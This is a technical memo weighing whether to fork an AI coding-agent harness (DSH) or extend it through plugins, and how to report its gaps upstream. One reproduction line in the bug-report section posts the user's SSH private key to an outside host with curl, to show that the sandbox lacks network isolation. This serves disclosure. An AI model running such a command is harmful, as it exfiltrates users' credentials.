# Fork DSH, or extend it? And how to give the work back

**Verdict: do not fork as the primary strategy. Ship a bundle set, and report the core gaps
upstream.** The evidence for that is unusually direct, and it also answers the "how do we contribute
back" half of the question.

---

## 1. Upstream does not accept pull requests: but it does accept plugins

This is stated in the repository, not inferred. [`CONTRIBUTING.md`](https://github.com/deepseek-ai/deepseek-harness/blob/main/CONTRIBUTING.md):

> DeepSeek Harness is still at an early stage and under active development. **We are sorry that we
> cannot accept external pull requests at the moment.**

It then names what to do instead, and the framing matters:

> Contribute to the plugin community: create a plugin that excites you and share it with others […]
> **DeepSeek Harness is designed to be deeply customizable. We do not believe that packages in the
> official repository are inherently more important than packages created by the community.** You
> may consider this repository an idea, an official example, and a source of inspiration, but not a
> mandate from us.

So "contribute back" has a different answer than it would for most projects:

| Route | Available? |
|---|---|
| Pull request to `deepseek-ai/deepseek-harness` | **No**: declined explicitly |
| GitHub Discussions (issues, bug reports, upvotes) | **Yes**: the named channel for defects |
| Publish a plugin package + the `dsh-plugin` GitHub topic | **Yes**: the sanctioned contribution |
| Fork and maintain a divergent harness | Legally fine (MIT), but see §4 |

The README repeats the discovery mechanism: *"Add the `dsh-plugin` topic to your plugin repository
for discoverability."*

**This means the plugin route is not a workaround for a closed door. It is the door.** The work
already done here. The guidance pack and `apply_patch`. Is exactly the shape upstream is asking
for, which is a much better position than a fork would be.

## 2. How far does the plugin model actually reach?

I had assumed several of my own recommendations were core-only. Checking the service APIs rather
than assuming, several are not.

| Capability | Reached by | Verified |
|---|---|---|
| Prompt sections, ordering, scoping | `ctx.systemPrompt.section()` | yes: first-party plugins do exactly this |
| New tools with schemas, presentation, sandbox escalation | `ctx.tools.register(defineTool(...))` | yes: this is how every tool ships |
| **Post-processing every tool result** | `tools/post-execute` waterfall → `PostToolDecision` (`core/tools/src/index.ts:176`) | yes |
| **Blocking or gating a tool call** | `tools/pre-execute` waterfall (`:153`) | yes |
| **Restricting which tools are visible** | `ctx.tools.restrict({allow, deny})` on a scoped context (`:1097`) | yes |
| **Programmatic compaction** | `ctx.compaction.compactNow(agent, signal, commandId)` (`compaction/compaction/src/index.ts:162`) | yes: `command-compact` is the only caller today |
| Per-scope service configuration | `intercept` patch key (`vendor/include/src/index.ts:138`) | yes: config, not implementation |
| Filesystem access with policy | `ctx.fs` | yes: used by `apply_patch` here |

And what plugins cannot do:

| Capability | Why not |
|---|---|
| Change another tool's definition (e.g. add `isConcurrencySafe` to `bash`) | Duplicate registration **throws**: *"tool \"name\" is already registered"* (`core/tools/src/index.ts:747`). Scoped shadowing exists but means reimplementing the tool. |
| Add a syscall-level network fence | A plugin has no access to the bwrap/Seatbelt/seccomp layer. |
| Add `removeText` to the `fs` seam | The abstract `FileSystem` class owns the operation vocabulary. |
| MCP OAuth | Lives inside `rmcp`-equivalent client internals. |
| Stream-time tool dispatch | Scheduler lives in `agent-loop`. |

That re-triage changes the plan materially. Three items I had filed as core work are plugin work:

- **Model-invocable compaction** (was Tier 3.5), a tool that calls `ctx.compaction.compactNow`.
- **Post-edit diagnostics** (was Tier 3.6). A `tools/post-execute` listener that runs a typechecker
 or language server and injects findings. The substrate Codex lacks is already here.
- **Capping MCP tool-schema cost** (part of Tier 3.2). `ctx.tools.restrict({deny: ['mcp_*']})` plus
 a `tool_search` tool that lifts restrictions as matches are found. That is ~9,300 tokens of every
 request, recoverable without touching the harness.

## 3. What a fork would actually buy

Three things, and only three:

1. **Network isolation**, the one finding where DSH is *unsafe*, not merely behind. No plugin
 can add it.
2. **Shell/edit/MCP concurrency**, a one-line argument-aware `isConcurrencySafe` per shell tool.
 Measured at 3% of tool time in my session; larger when batches hold slow commands.
3. **`fs.removeText`**, which unblocks `apply_patch` delete and rename.

A fork is also the only way to *fix* the smaller defects (the compaction headroom arithmetic, the
open parameter root, the unconditional prompt sections), but none of those justify one on their own, and two of them are reachable by other means anyway.

## 4. Why a fork is the wrong default

- **DSH is in developer preview and says so loudly.** The README: *"THERE WILL BE
 COMPATIBILITY-BREAKING CHANGES."* A fork is a rebase treadmill against a moving target, and every
 upstream fix has to be re-merged by hand.
- **A fork forfeits the thing that makes DSH worth using.** Its value is the composition model. A
 divergent harness loses upstream packages, presets, and fixes, the opposite of the goal.
- **You would maintain a security fence.** Once you own the sandbox, you own keeping it correct
 across three platforms. That is a much larger commitment than it looks.
- **The plugin path is already working.** Two packages, 68 passing tests, no harness change.
- **Forking cannot be upstreamed.** A plugin can be published and adopted; a fork cannot.

## 5. What to do instead

### Now: publish the plugins

The two packages built here are ready, and they are the contribution upstream asked for:

- `@l33tdawg/dsh-guidance-pack`. 19 tests
- `@l33tdawg/dsh-apply-patch`. 49 tests

To make them real contributions and not just local tooling:

1. Move them out of this workspace into their own repositories (one each. They solve unrelated
 problems, and separate packages let people adopt one without the other).
2. Publish to npm under a scope.
3. Add the **`dsh-plugin`** GitHub topic to each repository.
4. Write the READMEs for someone who has never seen this analysis. The *what* and *how*, with the
 comparison to Codex as motivation, not as the body. Both current READMEs lean heavily on
 DSH-internal file paths, which will rot; those belong in a design note, not the front page.

### Next: build the plugin-reachable core work

In rough value order:

| Plugin | Replaces | Notes |
|---|---|---|
| `tool-compact` | Tier 3.5 | Wraps `ctx.compaction.compactNow` as a model-facing tool. Small. |
| `verify-on-edit` | Tier 3.6 | `tools/post-execute` listener; run the project's typecheck/test and inject findings. The highest-value remaining item, and pure plugin. |
| `mcp-tool-search` | part of Tier 3.2 | `tools.restrict` + a search tool. Recovers ~9.3k tokens per request on MCP-heavy setups. |
| `network-guard` | partial Tier 3.1 | A `tools/pre-execute` policy that recognises network-capable commands and forces an approval. **Not a substitute for a syscall fence**: a determined command can evade pattern matching. Worth shipping only if labelled honestly as a speed bump. |
| `compaction-task-state` | Tier 2.6 | Re-inject the todo list after compaction. |

### Then: report the core gaps upstream

GitHub Discussions is the named channel, and a good report is one a maintainer can act on without
re-deriving it. For each item: the behaviour, the file and line, a reproduction, and the impact.

Priority order, highest first:

1. **No network dimension in the sandbox.** Lead with this, it is the only security-relevant
 finding. Include the reproduction: in a `read-only` session, `curl -d @$HOME/.ssh/id_rsa
 https://example.com` succeeds, because the Seatbelt profile is `(allow default)` plus
 `(deny file-write*)` and bwrap never passes `--unshare-net`. Note that the repo's own RFCs already
 acknowledge it, which makes it a scheduling question, not a disagreement.
2. **`isConcurrencySafe` on the shell tools.** Small, self-contained, measurable.
3. **Open parameter roots.** A misspelled `file_path` is a silent no-op; closing the root by default
 is a small change with a real safety payoff.
4. **Three unconditional prompt sections** wasting tokens on restricted agents.
5. **Compaction headroom arithmetic** on sub-~73.5k windows.

### Only if the first two go nowhere: a thin patch set, not a fork

If network isolation or shell concurrency becomes urgent and upstream cannot take it, the right
shape is **a small, rebasable patch series against a pinned upstream tag**, not a divergent harness.
Keep it to a handful of files, keep it rebased, and keep the bundle set working against stock DSH so
you can drop the patches the moment upstream lands an equivalent.

The test is simple: if the patch set ever needs its own release cadence, it has become a fork and you
have taken on the maintenance you were trying to avoid.

## 6. The honest summary

Asked "should we fork", the answer is no, but not because forking is hard. It is because the
measurement says most of the gap is reachable from where we already stand, and the part that is not
is best fixed by the people who own the sandbox. The plugin architecture is not a consolation prize
here; it is the intended extension mechanism, and upstream says so in writing.

That leaves the network finding as the one thing worth real urgency, and it is worth urgency as a
*bug report*, not as a fork.
